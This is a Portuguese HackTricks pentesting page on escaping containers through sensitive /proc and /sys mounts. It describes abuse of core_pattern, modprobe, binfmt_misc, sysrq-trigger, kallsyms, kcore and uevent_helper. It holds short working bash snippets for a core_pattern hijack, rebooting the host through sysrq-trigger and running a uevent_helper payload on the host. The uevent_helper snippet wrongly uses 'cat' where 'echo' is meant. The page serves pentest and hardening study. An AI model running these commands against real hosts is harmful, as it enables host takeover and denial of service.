<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


(_**Esta informação foi retirada de**_ [_**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**_](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts))

Devido à falta de suporte a namespace, a exposição de `/proc` e `/sys` oferece uma superfície de ataque significativa e divulgação de informações. Numerosos arquivos dentro do `procfs` e `sysfs` apresentam risco de escape de contêiner, modificação do host ou simples divulgação de informações que poderiam facilitar outros ataques.

Para abusar dessas técnicas, pode ser suficiente apenas **configurar incorretamente algo como `-v /proc:/host/proc`**, pois o AppArmor não protege `/host/proc`, porque **o AppArmor é baseado em caminho**

# procfs

## /proc/sys

`/proc/sys` normalmente permite acesso para modificar variáveis do kernel, frequentemente controladas por `sysctl(2)`.

### /proc/sys/kernel/core\_pattern

[/proc/sys/kernel/core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html) define um programa que é executado na geração de arquivo core (tipicamente uma falha de programa) e é passado o arquivo core como entrada padrão se o primeiro caractere deste arquivo for um símbolo de pipe `|`. Este programa é executado pelo usuário root e permitirá até 128 bytes de argumentos de linha de comando. Isso permitiria a execução trivial de código dentro do host do contêiner, dado qualquer falha e geração de arquivo core (que pode ser simplesmente descartado durante uma miríade de ações maliciosas).
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes #For testing
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
```
### /proc/sys/kernel/modprobe

[/proc/sys/kernel/modprobe](https://man7.org/linux/man-pages/man5/proc.5.html) contém o caminho para o carregador de módulos do kernel, que é chamado ao carregar um módulo do kernel, como por meio do comando [modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html). A execução de código pode ser obtida realizando qualquer ação que acione o kernel a tentar carregar um módulo do kernel (como usar a crypto-API para carregar um módulo criptográfico atualmente não carregado, ou usar ifconfig para carregar um módulo de rede para um dispositivo que não está sendo usado no momento).
```bash
# Check if you can directly access modprobe
ls -l `cat /proc/sys/kernel/modprobe`
```
### /proc/sys/vm/panic_on_oom

[/proc/sys/vm/panic_on_oom](https://man7.org/linux/man-pages/man5/proc.5.html) é uma flag global que determina se o kernel entrará em pânico quando uma condição de Memória Insuficiente (OOM) for atingida (em vez de invocar o OOM killer). Isso é mais um ataque de Negação de Serviço (DoS) do que uma fuga de contêiner, mas expõe uma capacidade que deveria estar disponível apenas para o host.

### /proc/sys/fs

O diretório [/proc/sys/fs](https://man7.org/linux/man-pages/man5/proc.5.html) contém uma variedade de opções e informações sobre vários aspectos do sistema de arquivos, incluindo quota, manipulação de arquivos, inode e informações de dentry. O acesso de escrita a este diretório permitiria vários ataques de negação de serviço contra o host.

### /proc/sys/fs/binfmt_misc

[/proc/sys/fs/binfmt_misc](https://man7.org/linux/man-pages/man5/proc.5.html) permite a execução de formatos binários diversos, o que normalmente significa que vários **interpretadores podem ser registrados para formatos binários não-nativos** (como Java) com base em seu número mágico. Você pode fazer o kernel executar um binário registrando-o como manipuladores.\
Você pode encontrar um exploit em [https://github.com/toffan/binfmt_misc](https://github.com/toffan/binfmt_misc): _Rootkit do pobre, aproveitando a opção_ [_credentials_](https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt_misc.txt#L62) _do_ [_binfmt_misc_](https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst) _para escalar privilégios através de qualquer binário suid (e obter um shell root) se `/proc/sys/fs/binfmt_misc/register` for gravável._

Para uma explicação mais aprofundada desta técnica, confira [https://www.youtube.com/watch?v=WBC7hhgMvQQ](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

## /proc/config.gz

[/proc/config.gz](https://man7.org/linux/man-pages/man5/proc.5.html) dependendo das configurações `CONFIG_IKCONFIG_PROC`, isso expõe uma versão comprimida das opções de configuração do kernel para o kernel em execução. Isso pode permitir que um contêiner comprometido ou malicioso descubra e direcione facilmente áreas vulneráveis ativadas no kernel.

## /proc/sysrq-trigger

`Sysrq` é um mecanismo antigo que pode ser invocado através de uma combinação especial de teclas `SysRq`. Isso pode permitir um reboot imediato do sistema, emissão de `sync(2)`, remontagem de todos os sistemas de arquivos como somente leitura, invocação de depuradores do kernel e outras operações.

Se o convidado não estiver devidamente isolado, ele pode acionar os comandos [sysrq](https://www.kernel.org/doc/html/v4.11/admin-guide/sysrq.html) escrevendo caracteres no arquivo `/proc/sysrq-trigger`.
```bash
# Reboot the host
echo b > /proc/sysrq-trigger
```
## /proc/kmsg

[/proc/kmsg](https://man7.org/linux/man-pages/man5/proc.5.html) pode expor mensagens do buffer de anel do kernel normalmente acessadas via `dmesg`. A exposição dessas informações pode auxiliar em exploits do kernel, desencadear vazamentos de endereços do kernel (que poderiam ser usados para ajudar a derrotar a Randomização do Layout do Espaço de Endereçamento do Kernel (KASLR)), e ser uma fonte de divulgação geral de informações sobre o kernel, hardware, pacotes bloqueados e outros detalhes do sistema.

## /proc/kallsyms

[/proc/kallsyms](https://man7.org/linux/man-pages/man5/proc.5.html) contém uma lista de símbolos exportados pelo kernel e seus endereços para módulos dinâmicos e carregáveis. Isso também inclui a localização da imagem do kernel na memória física, o que é útil para o desenvolvimento de exploits do kernel. A partir desses locais, o endereço base ou deslocamento do kernel pode ser localizado, o que pode ser usado para superar a Randomização do Layout do Espaço de Endereçamento do Kernel (KASLR).

Para sistemas com `kptr_restrict` definido como `1` ou `2`, este arquivo existirá, mas não fornecerá nenhuma informação de endereço (embora a ordem na qual os símbolos estão listados seja idêntica à ordem na memória).

## /proc/\[pid]/mem

[/proc/\[pid\]/mem](https://man7.org/linux/man-pages/man5/proc.5.html) expõe interfaces para o dispositivo de memória do kernel `/dev/mem`. Embora o Namespace PID possa proteger contra alguns ataques através deste vetor `procfs`, essa área tem sido historicamente vulnerável, depois considerada segura e novamente encontrada como [vulnerável](https://git.zx2c4.com/CVE-2012-0056/about/) para escalonamento de privilégios.

## /proc/kcore

[/proc/kcore](https://man7.org/linux/man-pages/man5/proc.5.html) representa a memória física do sistema e está em um formato de core ELF (tipicamente encontrado em arquivos de dump de core). Não permite a escrita nessa memória. A capacidade de ler este arquivo (restrito a usuários privilegiados) pode vazar conteúdos de memória do sistema hospedeiro e outros containers.

O grande tamanho de arquivo relatado representa a quantidade máxima de memória fisicamente endereçável para a arquitetura e pode causar problemas ao lê-lo (ou travamentos, dependendo da fragilidade do software).

[Dumping /proc/kcore em 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)

## /proc/kmem

`/proc/kmem` é uma interface alternativa para [/dev/kmem](https://man7.org/linux/man-pages/man4/kmem.4.html) (cujo acesso direto é bloqueado pela lista de permissões de dispositivos do cgroup), que é um arquivo de dispositivo de caractere representando a memória virtual do kernel. Permite tanto a leitura quanto a escrita, permitindo a modificação direta da memória do kernel.

## /proc/mem

`/proc/mem` é uma interface alternativa para [/dev/mem](https://man7.org/linux/man-pages/man4/kmem.4.html) (cujo acesso direto é bloqueado pela lista de permissões de dispositivos do cgroup), que é um arquivo de dispositivo de caractere representando a memória física do sistema. Permite tanto a leitura quanto a escrita, permitindo a modificação de toda a memória. (Requer um pouco mais de habilidade do que `kmem`, pois os endereços virtuais precisam ser resolvidos para endereços físicos primeiro).

## /proc/sched\_debug

`/proc/sched_debug` é um arquivo especial que retorna informações de agendamento de processos para todo o sistema. Essas informações incluem nomes de processos e IDs de processos de todos os namespaces, além de identificadores de cgroup de processos. Isso efetivamente contorna as proteções do Namespace PID e é legível por outros/mundo, portanto, pode ser explorado em containers não privilegiados também.

## /proc/\[pid]/mountinfo

[/proc/\[pid\]/mountinfo](https://man7.org/linux/man-pages/man5/proc.5.html) contém informações sobre pontos de montagem no namespace de montagem do processo. Expõe a localização do `rootfs` do container ou imagem.

# sysfs

## /sys/kernel/uevent\_helper

`uevents` são eventos acionados pelo kernel quando um dispositivo é adicionado ou removido. Notavelmente, o caminho para o `uevent_helper` pode ser modificado escrevendo em `/sys/kernel/uevent_helper`. Então, quando um `uevent` é acionado (o que também pode ser feito do userland escrevendo em arquivos como `/sys/class/mem/null/uevent`), o `uevent_helper` malicioso é executado.
```bash
# Creates a payload
cat "#!/bin/sh" > /evil-helper
cat "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets uevent_helper to /path/payload
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Triggers a uevent
echo change > /sys/class/mem/null/uevent
# or else
# echo /sbin/poweroff > /sys/kernel/uevent_helper
# Reads the output
cat /output
```
## /sys/class/thermal

Acesso ao ACPI e várias configurações de hardware para controle de temperatura, normalmente encontradas em laptops ou placas-mãe para jogos. Isso pode permitir ataques de DoS contra o host do container, que podem até levar a danos físicos.

## /sys/kernel/vmcoreinfo

Este arquivo pode vazar endereços do kernel que poderiam ser usados para derrotar o KASLR.

## /sys/kernel/security

Em `/sys/kernel/security` montado a interface `securityfs`, que permite a configuração de Módulos de Segurança Linux. Isso permite a configuração de [políticas AppArmor](https://gitlab.com/apparmor/apparmor/-/wikis/Kernel\_interfaces#securityfs-syskernelsecurityapparmor), e assim o acesso a isso pode permitir que um container desative seu sistema MAC.

## /sys/firmware/efi/vars

`/sys/firmware/efi/vars` expõe interfaces para interagir com variáveis EFI na NVRAM. Embora isso normalmente não seja relevante para a maioria dos servidores, o EFI está se tornando cada vez mais popular. Fraquezas de permissão até levaram a alguns laptops brickados.

## /sys/firmware/efi/efivars

`/sys/firmware/efi/efivars` fornece uma interface para escrever na NVRAM usada para argumentos de boot UEFI. Modificá-los pode tornar a máquina host ininicializável.

## /sys/kernel/debug

`debugfs` fornece uma interface "sem regras" pela qual o kernel (ou módulos do kernel) pode criar interfaces de depuração acessíveis ao espaço do usuário. Ele teve vários problemas de segurança no passado, e as diretrizes "sem regras" por trás do sistema de arquivos muitas vezes entraram em conflito com as restrições de segurança.

# Referências

* [Entendendo e Fortalecendo Containers Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusando de Containers Linux Privilegiados e Não Privilegiados](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
